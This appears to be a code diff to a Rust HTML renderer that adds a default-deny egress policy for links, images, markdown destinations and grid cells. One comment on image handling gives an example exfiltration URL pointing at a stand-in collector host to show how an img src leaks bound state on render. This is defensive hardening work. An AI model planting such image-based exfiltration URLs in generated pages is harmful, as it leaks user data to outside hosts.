@@ -47,20 +47,40 @@ use super::bindings::{
     static_display_string, try_bool, try_number, try_scalar_number, try_string,
 };
 use super::class_names::{icon_size_class, node_class_name, tone_var};
+use super::egress::{EgressClass, EgressPolicy, deny_non_local_egress, sanitize_url_for_egress};
 use super::html::{Attr, AttrVal, el, entity_encode, escape_attr, text_el, void_el};
-use super::markdown::to_html as markdown_to_html;
-use super::sanitize::sanitize_url_or_blank;
+use super::markdown::to_html_with_egress as markdown_to_html_with_egress;
 
 fn s(v: impl Into<String>) -> AttrVal {
     AttrVal::Str(v.into())
 }
 
-/// Per-render context: binding sources + the fragment registry + cycle guard +
-/// the island designation set. The expansion set is interior-mutable because
-/// the walk is single-threaded and the guard scopes push/pop around each
-/// fragment expansion.
+/// Splice a refusal marker list onto an element's attributes. Empty on an
+/// allow, so a permitted destination emits byte-identically.
+fn push_egress_attrs(attrs: &mut Vec<Attr>, egress: Vec<(&'static str, String)>) {
+    attrs.extend(egress.into_iter().map(|(k, v)| (k, s(v))));
+}
+
+/// Per-render context: binding sources + the ambient destination policy + the
+/// fragment registry + cycle guard + the island designation set. The expansion
+/// set is interior-mutable because the walk is single-threaded and the guard
+/// scopes push/pop around each fragment expansion.
 struct Ctx<'a> {
     sources: &'a BindingSources,
+    /// The AMBIENT destination policy (`WIRE_FORMAT.md` §14.1). Every `href`,
+    /// `src` and markdown destination this walk emits is checked against it,
+    /// with no caller opt-in anywhere on the path.
+    ///
+    /// **The default is [`deny_non_local_egress`] at every convenience entry
+    /// point**: an emission cannot declare its own egress, so absent a host's
+    /// declaration it gets none. [`super::egress::permissive_egress`] is reached
+    /// BY NAME, so a grep for `permissive` finds every host that has opted back
+    /// out — the permissive choice is visible in the host's own source instead
+    /// of inherited silently.
+    ///
+    /// Borrowed rather than owned, and never a `static mut` or a thread-local:
+    /// two renders under two different policies may run concurrently.
+    policy: &'a EgressPolicy,
     fragments: HashMap<String, &'a Node>,
     islands: &'a HashSet<String>,
     expanding: std::cell::RefCell<HashSet<String>>,
@@ -364,10 +384,15 @@ fn render_kind(ctx: &Ctx<'_>, node: &Node, semantic_attrs: &[Attr]) -> String {
                 &render_text(ctx.sources, &spec.text),
             )
         }
+        // The markdown body's own link and image destinations consult the
+        // AMBIENT policy — the policy-taking entry point, never the pure one.
+        // The pure `markdown::to_html` is the permissive case by construction,
+        // so reaching it here would leave a decoded body's egress unchecked
+        // while every other destination on this walk was policied.
         NodeKind::Markdown(spec) => el(
             "div",
             &[("class", s("fuaran-markdown"))],
-            &markdown_to_html(&render_text(ctx.sources, &spec.text)),
+            &markdown_to_html_with_egress(ctx.policy, &render_text(ctx.sources, &spec.text)),
         ),
         NodeKind::Metric(spec) => {
             // Phase 632/649 — the Metric value is a scalar slot: a
@@ -673,8 +698,16 @@ fn render_kind(ctx: &Ctx<'_>, node: &Node, semantic_attrs: &[Attr]) -> String {
             )
         }
         NodeKind::Link(spec) => {
-            let href =
-                sanitize_url_or_blank(&try_string(ctx.sources, &spec.href).unwrap_or_default());
+            // `Hyperlink` is the class even when `download` is set. The class
+            // names the SINK the browser reaches, and a `download` anchor is
+            // still a hyperlink the reader must act on; scoping it as
+            // `Download` would let a policy that denied hyperlinks admit the
+            // same destination by flipping one boolean on the tree.
+            let (href, egress_attrs) = sanitize_url_for_egress(
+                ctx.policy,
+                EgressClass::Hyperlink,
+                &try_string(ctx.sources, &spec.href).unwrap_or_default(),
+            );
             if spec.protection == Some(crate::wire::LinkProtection::Email)
                 && href.starts_with("mailto:")
             {
@@ -712,12 +745,26 @@ fn render_kind(ctx: &Ctx<'_>, node: &Node, semantic_attrs: &[Attr]) -> String {
                 }
                 // The node's a11y projection lands on the anchor.
                 attrs.extend_from_slice(semantic_attrs);
+                // The refusal marker rides the element carrying the refused
+                // href, so a reader of the DOM sees WHY this anchor points at
+                // `about:blank`. Empty on an allow.
+                push_egress_attrs(&mut attrs, egress_attrs);
                 text_el("a", &attrs, &render_text(ctx.sources, &spec.label))
             }
         }
         NodeKind::Image(spec) => {
-            let src =
-                sanitize_url_or_blank(&try_string(ctx.sources, &spec.src).unwrap_or_default());
+            // `Media` — and it is the class that matters most: the browser
+            // fetches an `src` with NO user act, so RENDERING the tree IS the
+            // request. `https://collector.example/?s=<bound state>` passes every
+            // scheme check — allowlisted scheme, well-formed host, no script
+            // anywhere — and exfiltrates on sight. Only the origin allowlist
+            // closes it, which is why the ambient default denies rather than
+            // waiting to be asked.
+            let (src, egress_attrs) = sanitize_url_for_egress(
+                ctx.policy,
+                EgressClass::Media,
+                &try_string(ctx.sources, &spec.src).unwrap_or_default(),
+            );
             let variant_class = match spec.variant {
                 ImageVariant::Avatar => "fuaran-image fuaran-image-avatar",
                 ImageVariant::Rounded => "fuaran-image fuaran-image-rounded",
@@ -730,6 +777,7 @@ fn render_kind(ctx: &Ctx<'_>, node: &Node, semantic_attrs: &[Attr]) -> String {
                 ("alt", s(render_text(ctx.sources, &spec.alt))),
             ];
             attrs.extend_from_slice(semantic_attrs);
+            push_egress_attrs(&mut attrs, egress_attrs);
             void_el("img", &attrs)
         }
         NodeKind::List(spec) => {
@@ -2488,14 +2536,21 @@ fn render_grid_cell(ctx: &Ctx<'_>, col: &ColumnErased, row: &JVal) -> String {
         ),
         // Decoded Link/Pill placeholders produce the "<closure>" sentinel —
         // rendered faithfully (the decoded-tree parity behaviour).
-        CellKindErased::Link => text_el(
-            "a",
-            &[
-                ("class", s("fuaran-grid-cell-link")),
-                ("href", s(sanitize_url_or_blank("<closure>"))),
-            ],
-            "<closure>",
-        ),
+        // The ambient destination policy, same as the `Link` node. Not an
+        // afterthought: a grid href comes from a row accessor over bound data,
+        // so a single decoded tree emits one per row, and a grid pointed at
+        // attacker-influenced rows is the highest-volume egress surface a
+        // renderer has. On a DECODED tree the accessor is the `"<closure>"`
+        // sentinel, which is schemeless and therefore same-origin — allowed
+        // under the deny default, refused under a policy that denies local.
+        CellKindErased::Link => {
+            let (href, egress_attrs) =
+                sanitize_url_for_egress(ctx.policy, EgressClass::Hyperlink, "<closure>");
+            let mut attrs: Vec<Attr> =
+                vec![("class", s("fuaran-grid-cell-link")), ("href", s(href))];
+            push_egress_attrs(&mut attrs, egress_attrs);
+            text_el("a", &attrs, "<closure>")
+        }
         CellKindErased::Pill => text_el(
             "span",
             &[("class", s("fuaran-grid-cell-pill fuaran-pill-default"))],
@@ -2893,11 +2948,29 @@ fn render_fragment_ref(ctx: &Ctx<'_>, parent_node_id: &str, name: &str) -> Strin
 /// With empty `sources`, `Static` bindings resolve and the rest fall back to
 /// their loading slot / em-dash placeholder.
 pub fn render_to_html(tree: &Node, sources: &BindingSources) -> String {
+    render_to_html_with_egress(&deny_non_local_egress(), tree, sources)
+}
+
+/// [`render_to_html`] under a host-declared destination policy.
+///
+/// The `_with_egress` pair is this crate's established shape for the seam
+/// ([`super::markdown::to_html_with_egress`] took it first), with **one
+/// deliberate difference in the default**: markdown's pure `to_html` IS the
+/// permissive case, because it is a documented pure function over a
+/// hand-authored string whose flipped default would rewrite fixtures in every
+/// host at once. A *renderer* entry point walks a DECODED tree, where the
+/// author is not the trust boundary, so its convenience default denies.
+pub fn render_to_html_with_egress(
+    policy: &EgressPolicy,
+    tree: &Node,
+    sources: &BindingSources,
+) -> String {
     let no_islands = HashSet::new();
     let mut fragments = HashMap::new();
     collect_fragments(&mut fragments, tree);
     let ctx = Ctx {
         sources,
+        policy,
         fragments,
         islands: &no_islands,
         expanding: std::cell::RefCell::new(HashSet::new()),
@@ -2930,7 +3003,21 @@ pub fn island_script_id(island_id: &str) -> String {
 /// embedded canonical wire tree as a `<script type="application/json">`
 /// payload a conformant client decodes and attaches against the server DOM.
 pub fn render_hydratable(tree: &Node, sources: &BindingSources) -> String {
-    let html = render_to_html(tree, sources);
+    render_hydratable_with_egress(&deny_non_local_egress(), tree, sources)
+}
+
+/// [`render_hydratable`] under a host-declared destination policy.
+///
+/// The embedded hydrate payload is the tree's own canonical wire JSON and is
+/// deliberately NOT filtered by the policy: it is the tree as decoded, and the
+/// client that adopts it applies its own ambient policy when it renders. A
+/// payload rewritten to match one server render would misreport what arrived.
+pub fn render_hydratable_with_egress(
+    policy: &EgressPolicy,
+    tree: &Node,
+    sources: &BindingSources,
+) -> String {
+    let html = render_to_html_with_egress(policy, tree, sources);
     let json = escape_for_script(&encode_node(tree));
     let script = el(
         "script",
@@ -2976,11 +3063,22 @@ fn island_children(node: &Node) -> Vec<&Node> {
 /// wire JSON. A page with **zero** islands returns exactly
 /// [`render_to_html`] — no wrappers, no scripts.
 pub fn render_with_islands(tree: &Node, sources: &BindingSources, island_ids: &[&str]) -> String {
+    render_with_islands_with_egress(&deny_non_local_egress(), tree, sources, island_ids)
+}
+
+/// [`render_with_islands`] under a host-declared destination policy.
+pub fn render_with_islands_with_egress(
+    policy: &EgressPolicy,
+    tree: &Node,
+    sources: &BindingSources,
+    island_ids: &[&str],
+) -> String {
     let islands: HashSet<String> = island_ids.iter().map(|id| id.to_string()).collect();
     let mut fragments = HashMap::new();
     collect_fragments(&mut fragments, tree);
     let ctx = Ctx {
         sources,
+        policy,
         fragments,
         islands: &islands,
         expanding: std::cell::RefCell::new(HashSet::new()),
